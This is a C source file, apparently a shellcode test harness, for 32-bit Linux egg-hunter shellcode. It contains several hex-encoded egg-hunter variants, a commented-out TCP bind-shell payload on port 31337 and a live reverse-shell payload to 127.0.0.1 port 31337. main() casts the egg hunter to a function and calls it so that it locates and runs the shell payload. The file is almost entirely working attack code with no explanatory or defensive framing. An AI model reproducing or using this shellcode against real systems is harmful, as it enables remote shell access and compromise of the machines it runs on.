#include<stdio.h>
#include<string.h>

#define EGG "\x90\x50\x90\x50" 

//sigaction(2) implementation
/*
unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x75\x01\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xee\xb8"
EGG
"\x89\xcf\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
*/

//access(2) implementation v2

unsigned char egghunter[] = \
"\x31\xd2\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"
EGG
"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


//access(2) v1
/*
unsigned char egghunter[] =\
"\xbb"
EGG
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
*/

/*
//payload: bind shell tcp, port 31337
unsigned char code [] =\
EGG
EGG
"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80";
*/

//payload: reverse shell, p 31337
unsigned char code [] =\
EGG
EGG
"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\x7f\x00\x00\x01\x66\x68\x7a\x69\x66\x53\x43\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
	printf("Egg Hunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();
}

	
